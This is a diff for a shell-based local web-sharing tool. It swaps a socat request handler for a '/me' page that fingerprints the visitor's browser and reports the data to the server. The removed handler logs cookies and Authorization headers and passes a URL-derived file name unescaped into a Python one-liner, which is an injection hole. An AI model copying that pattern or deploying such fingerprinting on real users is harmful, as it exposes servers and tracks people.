+    h+='</table><div class="fpid">visitor id: <b>computing…</b></div>'+
+       '<p class="fpnote">Collected by your browser and reported to this server — '+
+       'this is what any website can see about you.</p>'+
+       '<button class="fbtn" id="fpcopy">copy as JSON</button>';
+    mount.innerHTML=h;
 
-# ── Handler script for socat (text & file modes) ─────────────────────────────
-make_handler() {
-  local h
-  h=$(_mktmp /tmp/expose-handler.XXXXXX)
-  cat > "$h" <<'HANDLER'
-#!/bin/sh
-# Status code and reason phrase
-_RCODE="${EXPOSE_RESP_CODE:-200}"
-case "$_RCODE" in
-  200) _RREASON="OK" ;; 201) _RREASON="Created" ;; 204) _RREASON="No Content" ;;
-  301) _RREASON="Moved Permanently" ;; 302) _RREASON="Found" ;; 304) _RREASON="Not Modified" ;;
-  400) _RREASON="Bad Request" ;; 401) _RREASON="Unauthorized" ;; 403) _RREASON="Forbidden" ;;
-  404) _RREASON="Not Found" ;; 405) _RREASON="Method Not Allowed" ;;
-  418) _RREASON="I'm a Teapot" ;; 429) _RREASON="Too Many Requests" ;;
-  500) _RREASON="Internal Server Error" ;; 502) _RREASON="Bad Gateway" ;;
-  503) _RREASON="Service Unavailable" ;; *) _RREASON="Custom" ;;
-esac
-# Read request line
-read -r REQ 2>/dev/null || REQ=""
-REQ=$(printf '%s' "$REQ" | tr -d '\r')
+    var rows=mount.querySelectorAll('td:nth-child(2)');
+    var i=0;
+    order.forEach(function(k){
+      if(d[k]===undefined||d[k]==='')return;
+      rows[i++].textContent=String(d[k]);
+    });
 
-# Collect ALL headers
-ALL_HDRS=""
-UA="-"; ACCEPT=""; ACCEPT_LANG=""; ACCEPT_ENC=""; REFERER=""; HOST_HDR=""
-COOKIE=""; ORIGIN=""; DNT_HDR=""; CONTENT_TYPE=""; CONTENT_LEN=""
-XFF=""; CONNECTION=""; EXTRA_HDRS=""; AUTH_HDR=""
+    document.getElementById('fpcopy').addEventListener('click',function(){
+      var j=JSON.stringify(d,null,2);
+      var b=this;
+      function ok(){b.textContent='copied';setTimeout(function(){b.textContent='copy as JSON'},1200)}
+      if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(j).then(ok).catch(ok)}
+      else ok();
+    });
+  }
 
-while IFS= read -r hdr; do
-  hdr=$(printf '%s' "$hdr" | tr -d '\r')
-  [ -z "$hdr" ] && break
-  ALL_HDRS="${ALL_HDRS}${hdr}
-"
-  hdr_lower=$(printf '%s' "$hdr" | tr '[:upper:]' '[:lower:]')
-  val="${hdr#*: }"
-  case "$hdr_lower" in
-    user-agent:*)         UA="$val" ;;
-    accept:*)             ACCEPT="$val" ;;
-    accept-language:*)    ACCEPT_LANG="$val" ;;
-    accept-encoding:*)    ACCEPT_ENC="$val" ;;
-    referer:*)            REFERER="$val" ;;
-    host:*)               HOST_HDR="$val" ;;
-    cookie:*)             COOKIE="$val" ;;
-    origin:*)             ORIGIN="$val" ;;
-    dnt:*)                DNT_HDR="$val" ;;
-    content-type:*)       CONTENT_TYPE="$val" ;;
-    content-length:*)     CONTENT_LEN="$val" ;;
-    x-forwarded-for:*)    XFF="$val" ;;
-    connection:*)         CONNECTION="$val" ;;
-    authorization:*)      AUTH_HDR="$val"
-      EXTRA_HDRS="${EXTRA_HDRS}  ${hdr}
-" ;;
-    sec-*|cache-control:*|if-*|upgrade-*|pragma:*)
-      EXTRA_HDRS="${EXTRA_HDRS}  ${hdr}
-" ;;
-  esac
-done
+  // ── stable visitor id: SHA-256 over the stable signals ──
+  var stable=['user_agent','platform','languages','timezone','screen','cpu_cores',
+              'device_memory','gpu','canvas'].map(function(k){return d[k]}).join('|');
+  function show(id){
+    if(!mount)return;
+    var el=mount.querySelector('.fpid b');
+    if(el)el.textContent=id;
+  }
+  function finish(id){
+    d.visitor_id=id;
+    show(id);
+    report();
+  }
+  // ── report to the operator (logged to sqlite via POST /fp) ──
+  function report(){
+    d.page=location.pathname;
+    var payload;
+    try{payload=JSON.stringify(d)}catch(e){return}
+    try{
+      if(navigator.sendBeacon){
+        var ok=navigator.sendBeacon('/fp',new Blob([payload],{type:'application/json'}));
+        if(ok)return;
+      }
+      fetch('/fp',{method:'POST',headers:{'Content-Type':'application/json'},body:payload,keepalive:true}).catch(function(){});
+    }catch(e){}
+  }
+  if(window.crypto&&crypto.subtle&&crypto.subtle.digest){
+    crypto.subtle.digest('SHA-256',new TextEncoder().encode(stable)).then(function(buf){
+      var hex=Array.from(new Uint8Array(buf)).map(function(b){return('0'+b.toString(16)).slice(-2)}).join('');
+      finish(hex.slice(0,16));
+    }).catch(function(){finish('unavailable')});
+  }else finish('unavailable');
+})();
+FPJS
 
-# Extract method, path, HTTP version
-MTH="${REQ%% *}"; rest="${REQ#* }"; PTH="${rest%% *}"; HTTPVER="${rest##* }"
-[ -z "$MTH" ] && MTH="-"; [ -z "$PTH" ] && PTH="-"
-PEER="${SOCAT_PEERADDR:-unknown}"
-PEER_PORT="${SOCAT_PEERPORT:-?}"
+_ME_HTML=$(_mktmp /tmp/expose-me-html.XXXXXX)
+cat > "$_ME_HTML" << 'MEHTML'
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>expose / me</title>
+  <script>
+    try {
+      const theme = localStorage.getItem("expose-theme");
+      if (theme && theme !== "auto") document.documentElement.dataset.theme = theme;
+    } catch (_) {}
+  </script>
+  <style>
+    :root {
+      color-scheme: dark;
+      --bg: #0a0c10;
+      --surface: #10141b;
+      --border: #1f2632;
+      --text: #e8ebf1;
+      --dim: #9aa3b2;
+      --accent: #34d399;
+    }
+    :root[data-theme="light"] {
+      color-scheme: light;
+      --bg: #f4f6f9;
+      --surface: #fff;
+      --border: #dfe3ea;
+      --text: #182230;
+      --dim: #556173;
+      --accent: #059669;
+    }
+    @media (prefers-color-scheme: light) {
+      :root:not([data-theme]) {
+        color-scheme: light;
+        --bg: #f4f6f9;
+        --surface: #fff;
+        --border: #dfe3ea;
+        --text: #182230;
+        --dim: #556173;
+        --accent: #059669;
+      }
+    }
+    body {
+      max-width: 720px;
+      margin: 2.5rem auto;
+      padding: 0 1rem;
+      background: var(--bg);
+      color: var(--text);
+      font: 14px/1.6 system-ui, sans-serif;
+    }
+    h1 {
+      display: flex;
+      align-items: center;
+      gap: .65rem;
+      margin-bottom: 1.2rem;
+      color: var(--dim);
+      font-size: .95rem;
+      font-weight: 600;
+    }
+    h1 b, td:first-child, .fpid b { color: var(--accent); }
+    .logo {
+      display: grid;
+      width: 36px;
+      height: 36px;
+      place-items: center;
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      background: var(--surface);
+      color: var(--text);
+    }
+    .logo svg { width: 29px; height: 24px; }
+    h2 {
+      margin: 1.8rem 0 .8rem;
+      color: var(--dim);
+      font-size: .78rem;
+      letter-spacing: .08em;
+      text-transform: uppercase;
+    }
+    table {
+      width: 100%;
+      overflow: hidden;
+      border: 1px solid var(--border);
+      border-collapse: separate;
+      border-spacing: 0;
+      border-radius: 12px;
+      background: var(--surface);
+    }
+    td {
+      padding: .55rem .85rem;
+      border-bottom: 1px solid var(--border);
+      font: 12.5px ui-monospace, monospace;
+    }
+    tr:last-child td { border-bottom: 0; }
+    td:first-child { width: 11rem; white-space: nowrap; }
+    td:last-child { word-break: break-all; }
+    .fpid, .fpnote { color: var(--dim); }
+    .fbtn {
+      margin-top: .7rem;
+      padding: .45rem .8rem;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      background: var(--surface);
+      color: var(--dim);
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <h1><span class="logo" aria-hidden="true">{{LOGO}}</span><span><b>expose</b> / me</span></h1>
+  <table>{{ROWS}}</table>
+  <div id="fp"></div>
+  <script>{{FPJS}}</script>
+</body>
+</html>
+MEHTML
 
-# ── IP allowlist check ──
-if [ -n "${EXPOSE_ALLOW:-}" ]; then
-  _ALLOWED=$(python3 -c "
-import sys, ipaddress
-peer = sys.argv[1]
-try:
-    addr = ipaddress.ip_address(peer)
-    for cidr in sys.argv[2].split(','):
-        cidr = cidr.strip()
-        if cidr and addr in ipaddress.ip_network(cidr, strict=False):
-            print('1'); sys.exit(0)
-except Exception:
-    pass
-print('0')
-" "$PEER" "$EXPOSE_ALLOW" 2>/dev/null || echo "0")
-  if [ "$_ALLOWED" != "1" ]; then
-    BODY="403 Forbidden"
-    printf 'HTTP/1.1 403 Forbidden\r\nContent-Type: text/plain\r\nContent-Length: %s\r\nConnection: close\r\nServer: expose\r\n\r\n%s' "${#BODY}" "$BODY"
-    exit 0
-  fi
-fi
-
-# Increment request counter
-if [ -f "$EXPOSE_COUNTER" ]; then
-  N=$(cat "$EXPOSE_COUNTER" 2>/dev/null || echo 0)
-  N=$((N + 1))
-  echo "$N" > "$EXPOSE_COUNTER" 2>/dev/null
-else
-  N="?"
-fi
-
-TIME=$(date '+%H:%M:%S')
-
-if [ "${EXPOSE_VERBOSE:-0}" = "1" ]; then
-  # ── Reverse DNS ──
-  RDNS=""
-  if command -v dig >/dev/null 2>&1; then
-    RDNS=$(dig +short -x "$PEER" 2>/dev/null | head -1 | sed 's/\.$//') 
-  elif command -v getent >/dev/null 2>&1; then
-    RDNS=$(getent hosts "$PEER" 2>/dev/null | awk '{print $2}')
-  elif command -v host >/dev/null 2>&1; then
-    RDNS=$(host "$PEER" 2>/dev/null | awk '/pointer/{print $NF}' | sed 's/\.$//') 
-  fi
-  [ -z "$RDNS" ] && RDNS="-"
-
-  # ── Parse User-Agent into OS + Browser ──
-  BROWSER="-"; OS="-"
-  case "$UA" in
-    *Firefox/*)
-      ver=$(printf '%s' "$UA" | sed -n 's/.*Firefox\/\([^ ]*\).*/\1/p')
-      BROWSER="Firefox $ver" ;;
-    *Edg/*)
-      ver=$(printf '%s' "$UA" | sed -n 's/.*Edg\/\([^ ]*\).*/\1/p')
-      BROWSER="Edge $ver" ;;
-    *Chrome/*)
-      ver=$(printf '%s' "$UA" | sed -n 's/.*Chrome\/\([^ ]*\).*/\1/p')
-      BROWSER="Chrome $ver" ;;
-    *Safari/*)
-      ver=$(printf '%s' "$UA" | sed -n 's/.*Version\/\([^ ]*\).*/\1/p')
-      BROWSER="Safari $ver" ;;
-    *curl/*)
-      ver=$(printf '%s' "$UA" | sed -n 's/.*curl\/\([^ ]*\).*/\1/p')
-      BROWSER="curl $ver" ;;
-    *Wget/*)
-      BROWSER="Wget" ;;
-    *[Bb]ot*|*[Cc]rawl*|*[Ss]pider*)
-      BROWSER="Bot ($UA)" ;;
-  esac
-  case "$UA" in
-    *Linux*)   OS="Linux" ;;
-    *Mac\ OS*) OS="macOS" ;;
-    *Windows*) OS="Windows" ;;
-    *Android*) OS="Android" ;;
-    *iPhone*|*iPad*) OS="iOS" ;;
-  esac
-  # arch hint
-  case "$UA" in
-    *x86_64*|*x64*|*amd64*) OS="$OS x86_64" ;;
-    *aarch64*|*arm64*)       OS="$OS arm64" ;;
-    *armv7*|*armv6*)         OS="$OS arm" ;;
-  esac
-
-  # ── Verbose block ──
-  SEP="\e[2m│\e[0m"
-  printf '\n  \e[2m┌─ #%s ─────────────────────────────────────────────\e[0m\n' "$N" >&2
-  printf '  %b \e[2m%s\e[0m  \e[1m%s \e[36m%s\e[0m  \e[2m%s\e[0m\n' "$SEP" "$TIME" "$MTH" "$PTH" "$HTTPVER" >&2
-  printf '  %b \e[34mClient\e[0m    %s:%s' "$SEP" "$PEER" "$PEER_PORT" >&2
-  [ "$RDNS" != "-" ] && printf '  \e[2m(%s)\e[0m' "$RDNS" >&2
-  printf '\n' >&2
-  [ "$XFF" != "" ] && printf '  %b \e[34mProxy\e[0m     %s\n' "$SEP" "$XFF" >&2
-  printf '  %b \e[34mBrowser\e[0m   %s  \e[2m(%s)\e[0m\n' "$SEP" "$BROWSER" "$OS" >&2
-  [ -n "$HOST_HDR" ] &&   printf '  %b \e[34mHost\e[0m      %s\n' "$SEP" "$HOST_HDR" >&2
-  [ -n "$ACCEPT_LANG" ] && printf '  %b \e[34mLanguage\e[0m  %s\n' "$SEP" "$ACCEPT_LANG" >&2
-  [ -n "$ACCEPT" ] &&      printf '  %b \e[34mAccept\e[0m    %s\n' "$SEP" "$ACCEPT" >&2
-  [ -n "$ACCEPT_ENC" ] &&  printf '  %b \e[34mEncoding\e[0m  %s\n' "$SEP" "$ACCEPT_ENC" >&2
-  [ -n "$REFERER" ] &&     printf '  %b \e[34mReferer\e[0m   \e[4m%s\e[0m\n' "$SEP" "$REFERER" >&2
-  [ -n "$ORIGIN" ] &&      printf '  %b \e[34mOrigin\e[0m    %s\n' "$SEP" "$ORIGIN" >&2
-  [ -n "$COOKIE" ] &&      printf '  %b \e[34mCookies\e[0m   %s\n' "$SEP" "$COOKIE" >&2
-  [ -n "$CONNECTION" ] &&  printf '  %b \e[34mConn\e[0m      %s\n' "$SEP" "$CONNECTION" >&2
-  [ "$DNT_HDR" = "1" ] &&  printf '  %b \e[34mDNT\e[0m       \e[33myes\e[0m\n' "$SEP" >&2
-  [ -n "$CONTENT_TYPE" ] && printf '  %b \e[34mBody\e[0m      %s (%s bytes)\n' "$SEP" "$CONTENT_TYPE" "${CONTENT_LEN:--}" >&2
-  if [ -n "$EXTRA_HDRS" ]; then
-    printf '  %b \e[2m──────\e[0m\n' "$SEP" >&2
-    printf '%s' "$EXTRA_HDRS" | while IFS= read -r line; do
-      [ -n "$line" ] && printf '  %b \e[2m%s\e[0m\n' "$SEP" "$line" >&2
-    done
-  fi
-  printf '  \e[2m└───────────────────────────────────────────────────\e[0m\n' >&2
-else
-  # ── Compact one-liner (default) ──
-  printf '\e[2m%s\e[0m  \e[1;33m%-15s\e[0m  \e[1m%-7s\e[0m \e[36m%s\e[0m  \e[2m%s\e[0m\n' \
-    "$TIME" "$PEER" "$MTH" "$PTH" "$UA" >&2
-fi
-
-# ── Read request body (for --catch and log capture) ──────────────────────────
-REQ_BODY=""
-_BODY_LIMIT="${EXPOSE_BODY_LIMIT:-4096}"
-_PTHBASE_EARLY="${PTH%%\?*}"
-# Skip stdin capture for upload (Python handler needs stdin intact) and for
-# multipart (binary data causes null-byte issues in shell command substitution)
-_SKIP_BODY=0
-case "$_PTHBASE_EARLY" in /upload) _SKIP_BODY=1 ;; esac
-case "$CONTENT_TYPE" in *multipart/form-data*) _SKIP_BODY=1 ;; esac
-if [ "$_SKIP_BODY" = "0" ] && [ -n "$CONTENT_LEN" ] && [ "$CONTENT_LEN" -gt 0 ] 2>/dev/null; then
-  if [ "$_BODY_LIMIT" -gt 0 ] 2>/dev/null; then
-    _READ_LEN="$CONTENT_LEN"
-    [ "$_READ_LEN" -gt "$_BODY_LIMIT" ] && _READ_LEN="$_BODY_LIMIT"
-    REQ_BODY=$(head -c "$_READ_LEN" 2>/dev/null || true)
-    # drain remaining bytes so connection stays clean
-    _REMAINING=$(( CONTENT_LEN - _READ_LEN ))
-    [ "$_REMAINING" -gt 0 ] && head -c "$_REMAINING" >/dev/null 2>/dev/null
-  fi
-fi
-
-# ── Write to JSON log file ──
-if [ -n "${EXPOSE_LOGFILE:-}" ]; then
-  case "$PTH" in
-    /log|/log\?*|/log/clear|/meta|/upload/files|/me) ;; # skip internal API
-    *)
-  printf '%s' "$REQ_BODY" | python3 -c "
-import json,sys,os,time
-body_raw=sys.stdin.buffer.read()
-try: body_str=body_raw.decode('utf-8','replace')
-except: body_str=''
-e={'n':int(sys.argv[1]),'ts':time.time(),'time':sys.argv[2],'method':sys.argv[3],
-   'path':sys.argv[4],'httpver':sys.argv[5],'ip':sys.argv[6],'port':sys.argv[7],
-   'ua':sys.argv[8],'host':sys.argv[9],'accept':sys.argv[10],'accept_lang':sys.argv[11],
-   'accept_enc':sys.argv[12],'referer':sys.argv[13],'cookie':sys.argv[14],
-   'origin':sys.argv[15],'dnt':sys.argv[16],'content_type':sys.argv[17],
-   'content_len':sys.argv[18],'xff':sys.argv[19],'connection':sys.argv[20],
-   'auth':sys.argv[21]}
-if body_str: e['body']=body_str
-lf=sys.argv[22]
-try:
-  with open(lf,'r') as f: log=json.load(f)
-except: log=[]
-log.append(e)
-if len(log)>500: log=log[-500:]
-with open(lf,'w') as f: json.dump(log,f)
-" "$N" "$TIME" "$MTH" "$PTH" "$HTTPVER" "$PEER" "$PEER_PORT" \
-  "$UA" "$HOST_HDR" "$ACCEPT" "$ACCEPT_LANG" "$ACCEPT_ENC" "$REFERER" \
-  "$COOKIE" "$ORIGIN" "$DNT_HDR" "$CONTENT_TYPE" "${CONTENT_LEN:--}" \
-  "$XFF" "$CONNECTION" "$AUTH_HDR" "$EXPOSE_LOGFILE" 2>/dev/null &
-    ;;
-  esac
-fi
-
-# ── Auth check ──
-if [ -n "${EXPOSE_AUTH:-}" ]; then
-  AUTH_DECODED=""
-  if [ -n "$AUTH_HDR" ]; then
-    AUTH_B64="${AUTH_HDR#Basic }"
-    AUTH_DECODED=$(printf '%s' "$AUTH_B64" | base64 -d 2>/dev/null || true)
-  fi
-  if [ "$AUTH_DECODED" != "$EXPOSE_AUTH" ]; then
-    ABODY="401 Unauthorized"
-    printf 'HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: Basic realm="expose"\r\nContent-Type: text/plain\r\nContent-Length: %s\r\nConnection: close\r\nServer: expose\r\n\r\n%s' "${#ABODY}" "$ABODY"
-    exit 0
-  fi
-fi
-
-# ── Catch mode: dump request body ──
-if [ "${EXPOSE_CATCH:-0}" = "1" ] && [ -n "$CONTENT_LEN" ] && [ "$CONTENT_LEN" -gt 0 ] 2>/dev/null; then
-  if [ -n "$REQ_BODY" ]; then
-    CATCH_BODY="$REQ_BODY"
-  else
-    CATCH_BODY=$(head -c 4096 2>/dev/null || true)
-  fi
-  printf '\n  \e[35m┌─ body (%s bytes) ─────────────────────────\e[0m\n' "$CONTENT_LEN" >&2
-  if command -v xxd >/dev/null 2>&1; then
-    printf '%s' "$CATCH_BODY" | xxd -l 4096 >&2
-  else
-    printf '%s' "$CATCH_BODY" | od -A x -t x1z -N 4096 >&2
-  fi
-  [ "$CONTENT_LEN" -gt "$_BODY_LIMIT" ] && printf '  \e[2m… truncated (%s/%s bytes shown)\e[0m\n' "$_BODY_LIMIT" "$CONTENT_LEN" >&2
-  printf '  \e[35m└───────────────────────────────────────────────────\e[0m\n\n' >&2
-fi
-
-# ── Route and Respond ──
-_PTHBASE="${PTH%%\?*}"
-_PTHQUERY="${PTH#*\?}"
-[ "$_PTHQUERY" = "$PTH" ] && _PTHQUERY=""
-if [ "$_PTHBASE" = "/me" ] && [ "$MTH" = "GET" ]; then
-  _ACCEPT_HDR=$(printf '%s' "${ACCEPT:-}" | tr '[:upper:]' '[:lower:]')
-  case "$_ACCEPT_HDR" in
-    *application/json*|*json*)
-      BODY=$(python3 -c "
-import json,sys,os
-d={'ip':sys.argv[1],'port':sys.argv[2],'method':sys.argv[3],'httpver':sys.argv[4],
-   'host':sys.argv[5],'user_agent':sys.argv[6],'accept':sys.argv[7],
-   'accept_language':sys.argv[8],'accept_encoding':sys.argv[9],
-   'referer':sys.argv[10],'origin':sys.argv[11],'cookie':sys.argv[12],
-   'dnt':sys.argv[13],'x_forwarded_for':sys.argv[14],'connection':sys.argv[15],
-   'authorization':sys.argv[16],'content_type':sys.argv[17]}
-d={k:v for k,v in d.items() if v and v!='-'}
-print(json.dumps(d,indent=2))
-" "$PEER" "$PEER_PORT" "$MTH" "$HTTPVER" \
-  "$HOST_HDR" "$UA" "$ACCEPT" "$ACCEPT_LANG" "$ACCEPT_ENC" \
-  "$REFERER" "$ORIGIN" "$COOKIE" "$DNT_HDR" "$XFF" "$CONNECTION" \
-  "$AUTH_HDR" "$CONTENT_TYPE")
-      BLEN=$(printf '%s' "$BODY" | wc -c)
-      printf 'HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: %s\r\nConnection: close\r\nServer: expose\r\n\r\n%s' "$BLEN" "$BODY"
-      ;;
-    *)
-      BODY=$(python3 -c "
-import sys,html,json
-ip=sys.argv[1]; port=sys.argv[2]; method=sys.argv[3]; httpver=sys.argv[4]
-host=sys.argv[5]; ua=sys.argv[6]; accept=sys.argv[7]; accept_lang=sys.argv[8]
-accept_enc=sys.argv[9]; referer=sys.argv[10]; origin=sys.argv[11]; cookie=sys.argv[12]
-dnt=sys.argv[13]; xff=sys.argv[14]; connection=sys.argv[15]
-auth=sys.argv[16]; ct=sys.argv[17]
-fields=[('IP',ip+':'+port),('Method',method+' '+httpver),('Host',host),
-        ('User-Agent',ua),('Accept',accept),('Accept-Language',accept_lang),
-        ('Accept-Encoding',accept_enc),('Referer',referer),('Origin',origin),
-        ('Cookie',cookie),('DNT',dnt),('X-Forwarded-For',xff),
-        ('Connection',connection),('Authorization',auth),('Content-Type',ct)]
-rows=''.join('<tr><td>'+html.escape(k)+'</td><td>'+html.escape(v)+'</td></tr>'
-             for k,v in fields if v and v!='-')
-print('<html><head><meta charset=\"utf-8\"><title>expose / me</title>'
-      '<style>body{font:14px/1.6 ui-monospace,monospace;background:#1a1917;color:#c8c5be;'
-      'max-width:700px;margin:2rem auto;padding:0 1rem}'
-      'h1{font-size:1rem;color:#84817a;margin-bottom:1.5rem;font-weight:400}'
-      'h1 b{color:#c8c5be}'
-      'table{border-collapse:collapse;width:100%}'
-      'td{padding:.35rem .6rem;border-bottom:1px solid #2a2820;font-size:.8125rem}'
-      'td:first-child{color:#5c8abf;width:10rem;white-space:nowrap}'
-      'td:last-child{color:#c8c5be;word-break:break-all}'
-      '</style></head><body>'
-      '<h1><b>expose</b> / me</h1>'
-      '<table>'+rows+'</table>'
-      '</body></html>')
-" "$PEER" "$PEER_PORT" "$MTH" "$HTTPVER" \
-  "$HOST_HDR" "$UA" "$ACCEPT" "$ACCEPT_LANG" "$ACCEPT_ENC" \
-  "$REFERER" "$ORIGIN" "$COOKIE" "$DNT_HDR" "$XFF" "$CONNECTION" \
-  "$AUTH_HDR" "$CONTENT_TYPE")
-      BLEN=$(printf '%s' "$BODY" | wc -c)
-      printf 'HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: %s\r\nConnection: close\r\nServer: expose\r\n\r\n%s' "$BLEN" "$BODY"
-      ;;
-  esac
-elif [ "$_PTHBASE" = "/log" ] && [ "$MTH" = "GET" ]; then
-  _SINCE=""
-  case "$_PTHQUERY" in *since=*) _SINCE=$(printf '%s' "$_PTHQUERY" | sed 's/.*since=//;s/&.*//') ;; esac
-  BODY=$(cat "$EXPOSE_LOGFILE" 2>/dev/null || echo '[]')
-  if [ -n "$_SINCE" ]; then
-    BODY=$(python3 -c "import json,sys;d=json.loads(sys.stdin.read());print(json.dumps([e for e in d if e.get('n',0)>int(sys.argv[1])]))" "$_SINCE" <<< "$BODY" 2>/dev/null || echo '[]')
-  fi
-  BLEN=$(printf '%s' "$BODY" | wc -c)
-  printf 'HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: %s\r\nConnection: close\r\nServer: expose\r\n\r\n%s' "$BLEN" "$BODY"
-elif [ "$PTH" = "/log/clear" ] && [ "$MTH" = "POST" ]; then
-  echo '[]' > "$EXPOSE_LOGFILE" 2>/dev/null
-  BODY='{"ok":true}'
-  printf 'HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: %s\r\nConnection: close\r\nServer: expose\r\n\r\n%s' "${#BODY}" "$BODY"
-elif ([ "$PTH" = "/" ] || [ "$PTH" = "/upload" ]) && [ "$MTH" = "GET" ]; then
-  BODY=$(cat "$EXPOSE_UPLOAD_HTML")
-  BLEN=$(printf '%s' "$BODY" | wc -c)
-  printf 'HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: %s\r\nConnection: close\r\nServer: expose\r\n\r\n%s' "$BLEN" "$BODY"
-elif [ "$PTH" = "/meta" ] && [ "$MTH" = "GET" ]; then
-  BODY=$(python3 -c "import json,os
-m={'mode':os.environ.get('EXPOSE_MODE','text')}
-if m['mode']=='file':
-  m['name']=os.environ.get('EXPOSE_FILENAME','')
-  m['size']=int(os.environ.get('EXPOSE_LEN','0'))
-  m['mime']=os.environ.get('EXPOSE_MIME','')
-elif m['mode']=='text':
-  m['size']=int(os.environ.get('EXPOSE_LEN','0'))
-print(json.dumps(m))
-")
-  BLEN=$(printf '%s' "$BODY" | wc -c)
-  printf 'HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: %s\r\nConnection: close\r\nServer: expose\r\n\r\n%s' "$BLEN" "$BODY"
-elif [ "$PTH" = "/content" ] && [ "$MTH" = "GET" ]; then
-  _DISP=""
-  [ -n "${EXPOSE_FILENAME:-}" ] && _DISP="Content-Disposition: inline; filename=\"${EXPOSE_FILENAME}\"\r\n"
-  printf 'HTTP/1.1 %s %s\r\nContent-Type: %s\r\nContent-Length: %s\r\n%bConnection: close\r\nServer: expose\r\n%b\r\n' \
-    "$_RCODE" "$_RREASON" "$EXPOSE_MIME" "$EXPOSE_LEN" "$_DISP" "${EXPOSE_RESP_HEADERS:-}"
-  cat "$EXPOSE_CONTENT"
-elif [ "$PTH" = "/upload" ] && [ "$MTH" = "POST" ]; then
-  export UPLOAD_CT="$CONTENT_TYPE" UPLOAD_CL="$CONTENT_LEN"
-  python3 "$EXPOSE_UPLOAD_PY"
-elif [ "$PTH" = "/upload/files" ] && [ "$MTH" = "GET" ]; then
-  BODY=$(python3 -c "
-import os,json,stat as S
-d=os.environ['EXPOSE_UPLOAD_DIR']
-fs=[]
-if os.path.isdir(d):
-  for n in sorted(os.listdir(d)):
-    p=os.path.join(d,n)
-    if os.path.isfile(p):
-      s=os.stat(p)
-      fs.append({'name':n,'size':s.st_size,'mtime':int(s.st_mtime)})
-print(json.dumps(fs))
-")
-  BLEN=$(printf '%s' "$BODY" | wc -c)
-  printf 'HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: %s\r\nConnection: close\r\nServer: expose\r\n\r\n%s' "$BLEN" "$BODY"
-elif printf '%s' "$PTH" | grep -q '^/upload/files/' && [ "$MTH" = "GET" ]; then
-  FNAME=$(printf '%s' "$PTH" | sed 's|^/upload/files/||' | python3 -c 'import sys,urllib.parse;print(urllib.parse.unquote(sys.stdin.read().strip()))')
-  FPATH="$EXPOSE_UPLOAD_DIR/$FNAME"
-  FNAME_SAFE=$(printf '%s' "$FNAME" | sed 's/\.\.//')
-  if [ -f "$FPATH" ] && [ "$FNAME_SAFE" = "$FNAME" ]; then
-    FSIZE=$(stat -c'%s' "$FPATH" 2>/dev/null || wc -c < "$FPATH")
-    FMIME=$(python3 -c "import mimetypes;print(mimetypes.guess_type('$FPATH')[0] or 'application/octet-stream')")
-    printf 'HTTP/1.1 200 OK\r\nContent-Type: %s\r\nContent-Length: %s\r\nContent-Disposition: attachment; filename="%s"\r\nConnection: close\r\nServer: expose\r\n\r\n' "$FMIME" "$FSIZE" "$FNAME"
-    cat "$FPATH"
-  else
-    BODY='{"error":"not found"}'
-    printf 'HTTP/1.1 404 Not Found\r\nContent-Type: application/json\r\nContent-Length: %s\r\nConnection: close\r\n\r\n%s' "${#BODY}" "$BODY"
-  fi
-elif printf '%s' "$PTH" | grep -q '^/upload/files/' && [ "$MTH" = "DELETE" ]; then
-  FNAME=$(printf '%s' "$PTH" | sed 's|^/upload/files/||' | python3 -c 'import sys,urllib.parse;print(urllib.parse.unquote(sys.stdin.read().strip()))')
-  FPATH="$EXPOSE_UPLOAD_DIR/$FNAME"
-  FNAME_SAFE=$(printf '%s' "$FNAME" | sed 's/\.\.//')
-  if [ -f "$FPATH" ] && [ "$FNAME_SAFE" = "$FNAME" ]; then
-    rm -f "$FPATH"
-    BODY='{"ok":true}'
-    printf 'HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: %s\r\nConnection: close\r\nServer: expose\r\n\r\n%s' "${#BODY}" "$BODY"
-  else
-    BODY='{"error":"not found"}'
-    printf 'HTTP/1.1 404 Not Found\r\nContent-Type: application/json\r\nContent-Length: %s\r\nConnection: close\r\n\r\n%s' "${#BODY}" "$BODY"
-  fi
-elif [ "$PTH" = "/chat" ] && [ "$MTH" = "GET" ]; then
-  BODY=$(cat "${EXPOSE_CHAT_FILE:-}" 2>/dev/null || echo '[]')
-  BLEN=$(printf '%s' "$BODY" | wc -c)
-  printf 'HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: %s\r\nConnection: close\r\nServer: expose\r\n\r\n%s' "$BLEN" "$BODY"
-elif [ "$PTH" = "/chat" ] && [ "$MTH" = "POST" ]; then
-  if [ -n "${EXPOSE_CHAT_FILE:-}" ] && [ -n "$REQ_BODY" ]; then
-    BODY=$(printf '%s' "$REQ_BODY" | python3 -c "
-import json,sys,time
-cf=sys.argv[1]; msg=sys.stdin.read().strip()
-try:
-  with open(cf) as f: msgs=json.load(f)
-except: msgs=[]
-if msg:
-  msgs.append({'time':time.strftime('%H:%M:%S'),'msg':msg,'n':len(msgs)+1})
-if len(msgs)>200: msgs=msgs[-200:]
-with open(cf,'w') as f: json.dump(msgs,f)
-print(json.dumps({'ok':True,'count':len(msgs)}))
-" "$EXPOSE_CHAT_FILE" 2>/dev/null || echo '{"ok":false,"error":"server"}')
-  else
-    BODY='{"ok":false,"error":"empty"}'
-  fi
-  BLEN=$(printf '%s' "$BODY" | wc -c)
-  printf 'HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: %s\r\nConnection: close\r\nServer: expose\r\n\r\n%s' "$BLEN" "$BODY"
-else
-  BODY='Not Found'
-  printf 'HTTP/1.1 404 Not Found\r\nContent-Type: text/plain\r\nContent-Length: %s\r\nConnection: close\r\nServer: expose\r\n\r\n%s' "${#BODY}" "$BODY"
-fi
-
-# ── One-shot: stop server after this request ──
